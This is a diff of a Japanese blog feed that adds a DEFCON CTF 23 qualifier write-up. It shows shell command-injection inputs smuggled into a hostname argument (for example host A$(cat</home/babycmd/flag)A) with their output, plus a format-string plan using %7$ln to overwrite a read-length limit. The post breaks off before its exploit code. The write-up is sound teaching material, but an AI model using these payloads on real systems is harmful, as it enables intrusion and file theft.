@@ -4,7 +4,7 @@
   <title><![CDATA[犬アイコンのみっきー]]></title>
   <link href="http://mzyy94.com/atom.xml" rel="self"/>
   <link href="http://mzyy94.com/"/>
-  <updated>2015-05-07T19:38:51+09:00</updated>
+  <updated>2015-05-18T23:43:54+09:00</updated>
   <id>http://mzyy94.com/</id>
   <author>
     <name><![CDATA[mzyy94]]></name>
@@ -12,6 +12,801 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[DEFCON CTF 23予選Write-up]]></title>
+    <link href="http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup/"/>
+    <updated>2015-05-18T23:45:04+09:00</updated>
+    <id>http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup</id>
+    <content type="html"><![CDATA[<p>今年のDEFCON CTFの予選が5月16日午前9時から48時間開催されていました。今回はチーム********としての参加ではなく、Team ENUに派遣される形で参加してきました。</p>
+
+<p>今年は、比較的やさしいBaby&#8217;s First問題とPwn問題、リバースエンジニアリングのジャンルに属する問題が各数問あり、加えてWebとコーディングチャレンジが1問ずつありました。
+複数ある問題の中でFlagをsubmitしたのは1問だけですが、いくつか正解までたどり着くところまで解けたのでWrite-upを記します。</p>
+
+<!-- more -->
+
+
+<h1>Babycmd</h1>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: </span></code></pre></td></tr></table></div></figure>
+
+
+<p>pingとhostとdigコマンドが実行できるアプリケーションにアクセスして、どうにかしてflagを獲得する問題。
+逆アセンブルした結果、<em>コマンド[スペース]引数</em>として標準入力から渡すと、コマンドが( dig | ping | host | exit | help )かどうかで分岐し、引数が適切であるか、またIPアドレスかどうかをチェックし、コマンドをpopen経由で実行しているものでした。
+各コマンドは、引数がIPアドレスなのかそれ以外かで分岐し、</p>
+
+<table>
+<thead>
+<tr>
+<th>タイプ </th>
+<th> 実行コマンド</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>dig (IPアドレス）</td>
+<td> <code>dig -x 引数</code></td>
+</tr>
+<tr>
+<td>dig（文字列）</td>
+<td><code>dig '引数'</code></td>
+</tr>
+<tr>
+<td>ping（IPアドレスのみ）</td>
+<td><code>ping -c 3 -W 3 引数</code></td>
+</tr>
+<tr>
+<td>host（IPアドレス）</td>
+<td><code>host 引数</code></td>
+</tr>
+<tr>
+<td>host（文字列）</td>
+<td><code>host "引数"</code></td>
+</tr>
+</tbody>
+</table>
+
+
+<p>としてpopenで実行されるようになっていました。</p>
+
+<p>適当にPublic DNS宛にPingを送ってみると以下のような表示になりました。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: ping 8.8.8.8
+</span><span class='line'>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=1 ttl=128 time=9.51 ms
+</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=2 ttl=128 time=9.53 ms
+</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=3 ttl=128 time=9.95 ms
+</span><span class='line'>
+</span><span class='line'>--- 8.8.8.8 ping statistics ---
+</span><span class='line'>3 packets transmitted, 3 received, 0 0x7fffd2999630acket loss, time 2005ms
+</span><span class='line'>rtt min/avg/max/mdev = 9.515/9.667/9.956/0.219 ms
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>pingの出力結果に含まれる<strong>% Packet</strong>が、フォーマット文字列の<em>%p</em>として解釈され、アドレスが表示されていることがわかりました。format string attackとして攻められるような感じがしましたが、他の人が取り組んでいるようなので違う方法でアプローチをしていくことにしました。</p>
+
+<p>digとhostに文字列を渡した時の括りがそれぞれ違うことに注目しました。digではシングルクオートで、hostではダブルクオートでくくって引数を渡しています。
+シェル上では、ダブルクオートの文字列の中で変数を展開できます。<code>echo "$SHELL"</code>とすると<em>/bin/bash</em>と出力されるのがいい例です。今回の問題の場合は、<code>host $SHELL</code>として標準入力から渡すと、<code>host "/bin/bash"</code>として実行されると考えられます。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host $PWD
+</span><span class='line'>Invalid hostname.
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>しかしながら、試しに<code>host $PWD</code>として打ってみたところ、引数チェックで引っかかり、<em>popen</em>で実行されませんでした。</p>
+
+<p>逆コンパイルの結果、引数チェックでは最初と最後の文字が数字もしくはアルファベットでない場合にエラーとして実行させないようにしていることがわかったので、<code>host A${PWD}A</code>として実行してみました。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host $PWD
+</span><span class='line'>Invalid hostname.
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host A${PWD}A
+</span><span class='line'>Host A/A not found: 3(NXDOMAIN)
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>変数展開されていることが確認できました。/ディレクトリがカレントディレクトリのようです。</p>
+
+<p>これができることがわかると、次に挑戦したくなるのはコマンド結果の展開です。
+ダブルクオート中に変数を展開する要領で、<em>$(コマンド)</em>としてコマンドを実行し、文字列中に出力を展開するものです。例として、<code>echo "$(uname)"</code>とすると<em>Linux</em>と返ってきます。これを用いて実行中のユーザーを確認します。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host A$(whoami)A
+</span><span class='line'>Host AbabycmdA not found: 3(NXDOMAIN)
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>babycmdユーザーとして実行されていることがわかりました。
+そこで、ホームディレクトリ内のファイル一覧を取得してみることにしました。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host A$(ls /home/babycmd)A
+</span><span class='line'>sh: 1: ls/home/babycmd: not found
+</span><span class='line'>Host AA not found: 3(NXDOMAIN)
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>引数に渡される文字列に含まれるスペースが削られるようです。タブで代用してみました。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host A$(ls    /home/babycmd)A
+</span><span class='line'>Host Ababycmd
+</span><span class='line'>flagA not found: 3(NXDOMAIN)
+</span><span class='line'>Commands: ping, dig, host, exit</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ホームディレクトリにbabycmdとflagというファイルがあることがわかりました。
+catのリダイレクトでflagを抜いてしまいます。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>:  host A$(cat&lt;/home/babycmd/flag)A
+</span><span class='line'>Host AThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??A not found: 3(NXDOMAIN)
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>FLAG:<code>Pretty easy eh!!~ Now let's try something hArd3r, shallwe??</code></p>
+
+<h1>Babyecho</h1>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>標準入力で待ち受けしているので、文字列を送ると<del>そのまま</del>標準出力に的確に返してくれるプログラムにアクセスしてflagを得る問題です。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
+</span><span class='line'>%p.%p.%p.%p
+</span><span class='line'>0xd.0xa.(nil).0xd
+</span><span class='line'>Reading 13 bytes
+</span><span class='line'>0123456789abcdef
+</span><span class='line'>0123456789ab
+</span><span class='line'>Reading 13 bytes
+</span><span class='line'>def
+</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>フォーマット文字列が使えて、12文字を越えると次の入力として処理されるようです。</p>
+
+<p>バイナリを<code>strings</code>コマンドでみてみると、入力待ちの直前に表示されている<em>Reading 13 bytes</em>の13という数字は可変であることがわかります。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ strings ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d | grep Reading
+</span><span class='line'>Reading %d bytes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>フォーマット文字列を使ってスタックの中身をもうすこしみてみます。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
+</span><span class='line'>AAAA%5$p
+</span><span class='line'>AAAA0xffea839c
+</span><span class='line'>Reading 13 bytes
+</span><span class='line'>AAAA%6$p
+</span><span class='line'>AAAA(nil)
+</span><span class='line'>Reading 13 bytes
+</span><span class='line'>AAAA%7$p
+</span><span class='line'>AAAA0x41414141
+</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>AAAA%7$p</em>を渡した状態の時、以下のようにスタック(esp)に積まれていることがわかります。</p>
+
+<p><svg width="300" height="400">
+<g class="block" transform="translate(80,20)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x????????</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,60)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,100)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,140)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,180)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,220)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,260)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,300)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x41414141</tspan>
+</text>
+</g>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
+</svg></p>
+
+<p>esp+0x1cの位置から標準入力の値の格納バッファーが確保されているようです。</p>
+
+<p>先ほど調査したスタックをみてみると、読み込みバイト数らしき13(=0x0000000d)が2箇所積まれているのがわかります。
+IDA pro (demo)で入力待ちになるときの直前の処理を追ってみます。</p>
+
+<p><img src="http://mzyy94.com/blog/resources/images/2015/05/18/babyecho-debugging.png" alt="IDA pro demo debugging" /></p>
+
+<p>この入力と出力を繰り返すループ(0x08048FB6)の直前の処理で、サイズ0x420のスタックを用意し、スタック内の値をいくつかセットしているところがあります。この値のセットで、esp+0x14にesp+0x1cのアドレスをセットしている部分があります(0x08048f57)。esp+0x1cは、先ほどの調査より標準入力の値が格納されるバッファーの開始位置です。このことから、先ほど<em>AAAA%5$p</em>を入力して返ってきた値<em>0xffea839c</em>は、標準入力からの値を格納するバッファーのアドレスを指しているということになります。</p>
+
+<p>loc_8048fb6のループを見てみると、&#8221;Reading %d bytes\n&#8221;で表示されるバイト数をesp+0x10からesp+0x04にコピーしている処理があります(0x08048fcc)。printfで&#8221;Reading %d bytes\n&#8221;を表示した後、 esp+0x08に0x0aを入れ、標準入力からの読み取り上限をesp+0x10からesp+0x04にコピーしてセットし、esp+0x1cに標準入力からの値を読み取っています。</p>
+
+<p><svg width="640" height="400">
+<g class="block" transform="translate(80,20)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x????????</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,60)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,100)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,140)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,180)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,220)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,260)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,300)">
+<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
+</g>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,80)">&#8220;Reading %d bytes\n&#8221;で表示される数字</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,120)">定数(0x0a)</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,160)">定数(null)</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,200)">バッファーに読み込むバイト数</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,240)">バッファーの開始アドレス</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,280)">定数(null)</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,340)">バッファー領域</text>
+</svg></p>
+
+<p>これらの調査をもとに、バッファーに読み込むバイト数が格納されているesp+0x10の値を、esp+0x14に格納されているesp+0x1cのアドレスをもとに書き換え、読み込むバイト数の上限を書き換えて、攻撃コードを送り込む余地をつくる作戦が考えられます。
+アプローチとしては以下の図のようになります。</p>
+
+<p><svg width="640" height="400">
+<defs>
+<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
+<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
+</marker>
+</defs>
+<g class="block" transform="translate(80,20)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x????????</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,60)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,100)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,140)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,180)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="red" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000040d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,220)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,260)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,300)">
+<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
+</g>
+<g class="arrow" transform="translate(260,240)">
+<path stroke="#000000" fill="none" d="M0,0h40v60h-12" marker-end="url(#arrowhead)" stroke-width="1" />
+</g>
+<g class="arrow" transform="translate(280,190)">
+<path stroke="#000000" fill="none" d="M0,110h95v-110h-87" marker-end="url(#arrowhead)" stroke-width="1" />
+</g>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,40)">1. バッファーのアドレスを取得</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,80)">2. バイト数格納位置の1バイト上位へ移動</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,120)">3. その位置へ入力文字列長を格納</text>
+<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(310,270)">%5$10p</text>
+<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(380,240)">addr_buf - 0xb</text>
+<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(290,205)">%7$ln</text>
+</svg></p>
+
+<p>13バイト制限のため、2回に分けてこの方法を試行します。
+まず1回目に、<strong>%5$10p</strong>と入力することによって、esp+10に格納されているバッファーのアドレスを取得します。</p>
+
+<p>そのアドレスから0x0bを引くことによって、バッファーの読み込みバイト数が格納されているアドレスの1バイト上位のアドレスを計算します。
+これは、一度に送ることができる文字数が制限されていることによって、<strong>自由に大きな数値を指定できないため、</strong>バッファーのバイト数格納位置の1バイト上位に文字列長を書き込む方法をとったためです。今回の最大13バイトの入力という制限下では、最大でも7までしか数値をしていできません。7をそのままバッファー読み込みバイト数に格納しても、現状の13バイトより減ってしまいます。そのため、書き込む位置を上位にずらすことで、結果的にその数値をビットシフトによる掛け算で大きくし、バイト数制限の値を拡張しています。</p>
+
+<p>そして2回目の入力時に、先ほど計算したアドレスへ文字数である4を、%nフォーマット文字列を使って書き込みます。これによって、現在0x0000000bとなっている読み込みバイト数を、0x0000040bに書き換えることができます。</p>
+
+<p>コードは以下のようになります。</p>
+
